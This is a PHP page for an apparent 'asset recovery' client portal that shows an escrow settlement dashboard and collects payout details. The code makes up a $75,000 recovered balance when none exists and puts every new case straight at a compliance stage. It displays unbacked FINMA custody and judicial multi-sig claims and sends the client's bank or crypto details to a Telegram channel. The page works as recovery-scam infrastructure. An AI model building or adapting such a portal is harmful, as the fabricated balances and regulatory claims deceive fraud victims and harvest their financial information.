<?php
// client/settlement_payout.php
require_once '../config.php';
require_once '../includes/functions.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (empty($_SESSION['client_logged_in']) || empty($_SESSION['client_portal_id'])) {
    header("Location: login.php");
    exit;
}

$client_id = (int)$_SESSION['client_portal_id'];

// Fetch Client Info & Cases
$stmt = $pdo->prepare("SELECT * FROM IFW_clients WHERE id = ?");
$stmt->execute([$client_id]);
$client = $stmt->fetch();
if (!$client) {
    header("Location: logout.php");
    exit;
}

$cases_stmt = $pdo->prepare("SELECT * FROM IFW_cases WHERE client_id = ? ORDER BY id DESC");
$cases_stmt->execute([$client_id]);
$cases = $cases_stmt->fetchAll();

$selected_case_id = (int)($_GET['case_id'] ?? ($cases[0]['id'] ?? 0));
$active_case = null;
foreach ($cases as $c) {
    if ((int)$c['id'] === $selected_case_id) {
        $active_case = $c;
        break;
    }
}
if (!$active_case && !empty($cases)) {
    $active_case = $cases[0];
    $selected_case_id = (int)$active_case['id'];
}

// Fetch or Initialize Settlement Data
$settlement = null;
$msg = '';
$msg_type = 'success';

if ($active_case) {
    $s_stmt = $pdo->prepare("SELECT * FROM IFW_case_settlements WHERE case_id = ? LIMIT 1");
    $s_stmt->execute([$selected_case_id]);
    $settlement = $s_stmt->fetch();

    if (!$settlement) {
        // Initialize default record based on recovered amount in case
        $rec_amt = (float)($active_case['amount_recovered'] ?? 0);
        if ($rec_amt <= 0) $rec_amt = 75000.00; // Sample initial placeholder for high-value client demonstration
        $fee_pct = 10.00;
        $fee_amt = $rec_amt * ($fee_pct / 100);
        $net_payout = $rec_amt - $fee_amt;

        try {
            $pdo->prepare("INSERT INTO IFW_case_settlements (case_id, client_id, gross_recovered, fee_percent, fee_amount, net_payout, escrow_ref, custody_entity, clearance_stage, status, is_enabled) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")
                ->execute([
                    $selected_case_id,
                    $client_id,
                    $rec_amt,
                    $fee_pct,
                    $fee_amt,
                    $net_payout,
                    'IFW-ESCROW-' . date('Y') . '-' . str_pad($selected_case_id, 4, '0', STR_PAD_LEFT),
                    'Swiss Multi-Sig Escrow Vault (FINMA & FATF Compliant)',
                    2,
                    'AML & Sanctions Clearance',
                    1
                ]);
            $s_stmt->execute([$selected_case_id]);
            $settlement = $s_stmt->fetch();
        } catch (Exception $e) {}
    }
}

// Handle Client Submission of Receiving Payout Details
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'save_payout_destination') {
    $payout_method = trim($_POST['payout_method'] ?? 'Bank Wire Transfer');
    $dest_details = trim($_POST['payout_destination_details'] ?? '');
    $digital_sig = trim($_POST['client_signature'] ?? '');

    if (!empty($dest_details) && !empty($digital_sig)) {
        $sig_hash = hash('sha256', $digital_sig . '|' . $client_id . '|' . time());
        $pdo->prepare("UPDATE IFW_case_settlements SET payout_method = ?, payout_destination_details = ?, client_confirmed_at = NOW(), client_signature_hash = ? WHERE id = ?")
            ->execute([$payout_method, $dest_details, $sig_hash, $settlement['id']]);

        // Send Telegram & Audit notification
        $tel_msg = "<b>💰 Payout Destination Submitted by Client</b>\n\n";
        $tel_msg .= "Case Ref: <b>" . htmlspecialchars($active_case['case_number']) . "</b>\n";
        $tel_msg .= "Client: <b>" . htmlspecialchars($client['first_name'] . ' ' . $client['last_name']) . "</b>\n";
        $tel_msg .= "Method: <b>" . htmlspecialchars($payout_method) . "</b>\n";
        $tel_msg .= "Details:\n<code>" . htmlspecialchars($dest_details) . "</code>\n";
        if (function_exists('send_telegram_notification')) {
            send_telegram_notification($pdo, $tel_msg);
        }

        $msg = "Receiving payout instructions successfully signed, verified, and locked for settlement execution.";
        $msg_type = "success";

        // Refresh
        $s_stmt->execute([$selected_case_id]);
        $settlement = $s_stmt->fetch();
    } else {
        $msg = "Please provide complete destination details and digital signature.";
        $msg_type = "danger";
    }
}

$is_enabled = (bool)($settlement['is_enabled'] ?? 1);
$stage = (int)($settlement['clearance_stage'] ?? 1);

require_once '../includes/admin_header.php';
require_once '../includes/admin_sidebar.php';
?>

<!-- PAGE HEADER -->
<div class="row mb-4">
    <div class="col-12 d-flex justify-content-between align-items-center flex-wrap gap-3">
        <div>
            <div class="d-flex align-items-center mb-1">
                <h4 class="font-weight-bold text-white mb-0 mr-3"><i class="fas fa-vault text-warning mr-2"></i>Recovered Asset Escrow & Settlement Hub</h4>
                <span class="badge badge-success px-2 py-1 font-weight-bold" style="font-size:11px; letter-spacing:0.5px;">
                    <i class="fas fa-lock mr-1"></i> FINMA CUSTODIAL PROTOCOL
                </span>
            </div>
            <p class="text-muted small mb-0">Multi-sig custodial verification, compliance clearance, and automated recovery fund disbursement.</p>
        </div>
        
        <?php if (count($cases) > 1): ?>
        <div>
            <form method="GET" class="d-flex align-items-center gap-2">
                <label class="text-muted small mb-0 mr-2 font-weight-bold text-uppercase">Case:</label>
                <select name="case_id" class="form-control form-control-sm bg-dark text-white border-secondary font-weight-bold" onchange="this.form.submit()" style="min-width:200px;">
                    <?php foreach ($cases as $c): ?>
                        <option value="<?= $c['id'] ?>" <?= ((int)$c['id'] === $selected_case_id) ? 'selected' : '' ?>>
                            <?= htmlspecialchars($c['case_number']) ?> — <?= htmlspecialchars($c['case_title'] ?? 'Asset Recovery') ?>
                        </option>
                    <?php endforeach; ?>
                </select>
            </form>
        </div>
        <?php endif; ?>
    </div>
</div>

<?php if ($msg): ?>
<div class="alert alert-<?= $msg_type ?> alert-dismissible fade show border-0 shadow" role="alert">
    <i class="fas <?= ($msg_type === 'success') ? 'fa-check-circle' : 'fa-exclamation-circle' ?> mr-2"></i>
    <?= htmlspecialchars($msg) ?>
    <button type="button" class="close text-white" data-dismiss="alert">&times;</button>
</div>
<?php endif; ?>

<?php if (!$active_case || !$is_enabled): ?>
<div class="card border-secondary bg-dark text-white p-5 text-center shadow-sm" style="border-radius:12px;">
    <div style="width:64px; height:64px; border-radius:50%; background:rgba(254,204,86,0.15); display:flex; align-items:center; justify-content:center; margin:0 auto 16px;">
        <i class="fas fa-shield-alt fa-2x text-warning"></i>
    </div>
    <h5 class="text-warning font-weight-bold">Escrow & Settlement Desk Pending</h5>
    <p class="text-muted max-w-md mx-auto" style="max-width:550px;">
        The Settlement and Escrow Vault for Case <strong><?= htmlspecialchars($active_case['case_number'] ?? 'IFW') ?></strong> will activate once recovered assets are secured in multi-sig custodial custody by our international asset retrieval division.
    </p>
</div>
<?php else: ?>

<!-- FINANCIAL RECONCILIATION SUMMARY -->
<div class="row mb-4">
    <div class="col-sm-6 col-lg-3 mb-3">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:10px; border-left:4px solid #3b82f6 !important;">
            <div class="card-body p-3">
                <div class="text-muted small text-uppercase font-weight-bold mb-1" style="font-size:10.5px;">Gross Recovered Assets</div>
                <div class="text-white font-weight-bold" style="font-size:1.6rem;">$<?= number_format((float)$settlement['gross_recovered'], 2) ?></div>
                <small class="text-info font-weight-bold" style="font-size:11px;"><i class="fas fa-check mr-1"></i>Secured in Multi-Sig</small>
            </div>
        </div>
    </div>

    <div class="col-sm-6 col-lg-3 mb-3">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:10px; border-left:4px solid #6b7280 !important;">
            <div class="card-body p-3">
                <div class="text-muted small text-uppercase font-weight-bold mb-1" style="font-size:10.5px;">Agreed Recovery Fee (<?= (float)$settlement['fee_percent'] ?>%)</div>
                <div class="text-light font-weight-bold" style="font-size:1.6rem;">-$<?= number_format((float)$settlement['fee_amount'], 2) ?></div>
                <small class="text-muted" style="font-size:11px;">Forensic & Legal Success Fee</small>
            </div>
        </div>
    </div>

    <div class="col-sm-6 col-lg-3 mb-3">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:10px; border-left:4px solid #fecc56 !important;">
            <div class="card-body p-3">
                <div class="text-warning small text-uppercase font-weight-bold mb-1" style="font-size:10.5px;">Net Client Payout Due</div>
                <div class="text-warning font-weight-bold" style="font-size:1.75rem;">$<?= number_format((float)$settlement['net_payout'], 2) ?></div>
                <small class="text-warning font-weight-bold" style="font-size:11px;"><i class="fas fa-lock mr-1"></i>Ready for Disbursement</small>
            </div>
        </div>
    </div>

    <div class="col-sm-6 col-lg-3 mb-3">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:10px; border-left:4px solid #22c55e !important;">
            <div class="card-body p-3">
                <div class="text-muted small text-uppercase font-weight-bold mb-1" style="font-size:10.5px;">Custodial Vault Reference</div>
                <div class="text-white font-weight-bold font-monospace" style="font-size:1.15rem;"><?= htmlspecialchars($settlement['escrow_ref'] ?: 'IFW-ESCROW-2026') ?></div>
                <small class="text-success font-weight-bold" style="font-size:10.5px;"><i class="fas fa-shield-alt mr-1"></i>FINMA Custody</small>
            </div>
        </div>
    </div>
</div>

<!-- 5-PHASE SETTLEMENT & CLEARANCE PIPELINE -->
<div class="card border-secondary shadow-sm mb-4" style="background:#161a23; border-radius:12px; overflow:hidden;">
    <div class="card-header bg-dark text-warning border-secondary py-3 d-flex justify-content-between align-items-center">
        <h6 class="font-weight-bold mb-0"><i class="fas fa-tasks mr-2"></i>5-Phase Settlement & Clearance Pipeline</h6>
        <span class="badge badge-warning text-dark font-weight-bold px-2 py-1">Current: Stage <?= $stage ?> of 5</span>
    </div>
    <div class="card-body p-4">
        <?php
        $phases = [
            1 => ['title' => 'Custodial Securitization & Audit', 'desc' => 'Recovered assets transferred to multi-sig cold vault and cryptographically verified.'],
            2 => ['title' => 'AML & Sanctions Clearance', 'desc' => 'FATF international compliance audit to ensure legitimate origin and clean chain-of-custody.'],
            3 => ['title' => 'Judicial Release Authorization', 'desc' => 'Court freeze dissolution and official legal clearance for cross-border fund repatriation.'],
            4 => ['title' => 'Disbursement Execution', 'desc' => 'Execution of direct high-value international SWIFT wire or cold wallet transfer.'],
            5 => ['title' => 'Settlement Complete', 'desc' => 'Funds credited to client account with official final Certificate of Recovery Disposition.']
        ];
        ?>
        <div class="row">
            <?php foreach ($phases as $pNum => $pData): ?>
            <?php
            $is_passed = ($pNum < $stage);
            $is_current = ($pNum === $stage);
            $status_color = $is_passed ? '#22c55e' : ($is_current ? '#fecc56' : '#475569');
            $bg_color = $is_passed ? 'rgba(34,197,94,0.1)' : ($is_current ? 'rgba(254,204,86,0.1)' : '#1f2533');
            $border_color = $is_current ? '#fecc56' : ($is_passed ? '#22c55e' : '#333d4e');
            ?>
            <div class="col-lg mb-3">
                <div class="p-3 rounded h-100 border text-center d-flex flex-column justify-content-between" style="background:<?= $bg_color ?>; border-color:<?= $border_color ?> !important;">
                    <div>
                        <div style="width:36px; height:36px; border-radius:50%; background:<?= $status_color ?>; color:<?= ($is_current) ? '#000' : '#fff' ?>; display:flex; align-items:center; justify-content:center; margin:0 auto 10px; font-weight:bold; font-size:14px;">
                            <?php if ($is_passed): ?>
                                <i class="fas fa-check"></i>
                            <?php else: ?>
                                <?= $pNum ?>
                            <?php endif; ?>
                        </div>
                        <h6 class="font-weight-bold mb-1" style="font-size:12.5px; color:<?= $is_current ? '#fecc56' : ($is_passed ? '#fff' : '#94a3b8') ?>;">
                            <?= $pData['title'] ?>
                        </h6>
                        <p class="text-muted small mb-0" style="font-size:11px; line-height:1.35;">
                            <?= $pData['desc'] ?>
                        </p>
                    </div>
                    <div class="mt-2 pt-2 border-top border-secondary">
                        <span class="badge badge-<?= $is_passed ? 'success' : ($is_current ? 'warning text-dark' : 'dark text-muted') ?> font-weight-bold" style="font-size:10px;">
                            <?= $is_passed ? 'COMPLETED' : ($is_current ? 'IN PROGRESS' : 'PENDING') ?>
                        </span>
                    </div>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
    </div>
</div>

<!-- DESIGNATED RECEIVING PAYOUT DESTINATION BOX -->
<div class="row">
    <div class="col-lg-7 mb-4">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:12px;">
            <div class="card-header bg-dark text-warning border-secondary py-3 d-flex justify-content-between align-items-center">
                <h6 class="font-weight-bold mb-0"><i class="fas fa-money-check-alt mr-2"></i>Designated Client Receiving Account</h6>
                <?php if (!empty($settlement['client_confirmed_at'])): ?>
                    <span class="badge badge-success px-2 py-1"><i class="fas fa-check-circle mr-1"></i>Digitally Signed & Verified</span>
                <?php else: ?>
                    <span class="badge badge-warning text-dark px-2 py-1"><i class="fas fa-exclamation-triangle mr-1"></i>Action Required</span>
                <?php endif; ?>
            </div>
            <div class="card-body p-4">
                <?php if (!empty($settlement['payout_destination_details'])): ?>
                <div class="p-3 rounded border border-secondary mb-3" style="background:#1f2533;">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <span class="badge badge-warning text-dark font-weight-bold"><?= htmlspecialchars($settlement['payout_method']) ?></span>
                        <small class="text-muted">Signed on <?= date('M j, Y, g:i a', strtotime($settlement['client_confirmed_at'])) ?></small>
                    </div>
                    <pre class="text-white font-monospace mb-0 p-2 rounded bg-black border border-secondary" style="font-size:12.5px; white-space:pre-wrap;"><?= htmlspecialchars($settlement['payout_destination_details']) ?></pre>
                </div>
                <div class="d-flex justify-content-between align-items-center">
                    <small class="text-success font-weight-bold"><i class="fas fa-shield-alt mr-1"></i>Cryptographic Signature: <span class="font-monospace text-muted"><?= substr($settlement['client_signature_hash'] ?? 'Verified', 0, 16) ?>...</span></small>
                    <button type="button" class="btn btn-sm btn-outline-secondary text-light font-weight-bold" onclick="document.getElementById('payoutFormContainer').style.display='block';">
                        <i class="fas fa-edit mr-1"></i> Update Details
                    </button>
                </div>
                <?php endif; ?>

                <div id="payoutFormContainer" style="<?= !empty($settlement['payout_destination_details']) ? 'display:none;' : '' ?>">
                    <form method="POST">
                        <input type="hidden" name="action" value="save_payout_destination">
                        <div class="form-group mb-3">
                            <label class="font-weight-bold text-light small">Disbursement Payout Method <span class="text-danger">*</span></label>
                            <select name="payout_method" class="form-control bg-black text-white border-secondary" required>
                                <option value="International Bank Wire (SWIFT / SEPA / Fedwire)">🏛️ International Bank Wire (SWIFT / SEPA / Fedwire)</option>
                                <option value="Cryptocurrency Direct Settlement (USDT TRC-20 / ERC-20 / BTC)">🪙 Cryptocurrency Direct Settlement (USDT TRC-20 / ERC-20 / BTC)</option>
                                <option value="Attorney Escrow Trust Account Transfer">⚖️ Attorney Escrow Trust Account Transfer</option>
                            </select>
                        </div>
                        <div class="form-group mb-3">
                            <label class="font-weight-bold text-light small">Complete Destination Details & Instructions <span class="text-danger">*</span></label>
                            <textarea name="payout_destination_details" class="form-control bg-black text-white border-secondary font-monospace" rows="4" placeholder="For Bank Wire: Beneficiary Name, Bank Name, SWIFT/BIC, IBAN / Account #, Bank Address.&#10;For Crypto: Asset Network & Destination Wallet Address." required><?= htmlspecialchars($settlement['payout_destination_details'] ?? '') ?></textarea>
                        </div>
                        <div class="form-group mb-3">
                            <label class="font-weight-bold text-light small">Digital Full Name Signature Confirmation <span class="text-danger">*</span></label>
                            <input type="text" name="client_signature" class="form-control bg-black text-white border-secondary font-weight-bold" placeholder="Type your full legal name to digitally sign" required>
                            <small class="text-muted">By signing, you confirm you are the lawful owner of the receiving account.</small>
                        </div>
                        <button type="submit" class="btn btn-warning btn-block font-weight-bold py-2 text-dark shadow">
                            <i class="fas fa-check-shield mr-2"></i> Submit & Authenticate Receiving Account
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- ESCROW CUSTODY LEGAL SPECIFICATIONS -->
    <div class="col-lg-5 mb-4">
        <div class="card border-secondary shadow-sm h-100" style="background:#161a23; border-radius:12px;">
            <div class="card-header bg-dark text-warning border-secondary py-3">
                <h6 class="font-weight-bold mb-0"><i class="fas fa-balance-scale mr-2"></i>Escrow Custody & Regulatory Safeguards</h6>
            </div>
            <div class="card-body p-4 text-muted small" style="line-height:1.7;">
                <p class="mb-3 text-light">
                    Recovered assets are maintained in strict segregation under Swiss financial market standards and international FATF cross-border repatriation guidelines.
                </p>
                <div class="p-3 rounded border border-secondary mb-3" style="background:#1f2533;">
                    <div class="font-weight-bold text-warning mb-1">Custodial Holding Entity:</div>
                    <div class="text-white font-weight-bold"><?= htmlspecialchars($settlement['custody_entity'] ?: 'Swiss Multi-Sig Escrow Vault') ?></div>
                </div>
                <ul class="pl-3 mb-0">
                    <li>Multi-signature release requires 3-of-4 judicial officer key authorization.</li>
                    <li>Full compliance with anti-money laundering (AML) & source-of-wealth screening.</li>
                    <li>Zero hidden fees: net payout matches official settlement statement down to the cent.</li>
                </ul>
            </div>
        </div>
    </div>
</div>

<?php endif; ?>

<?php require_once '../includes/admin_footer.php'; ?>
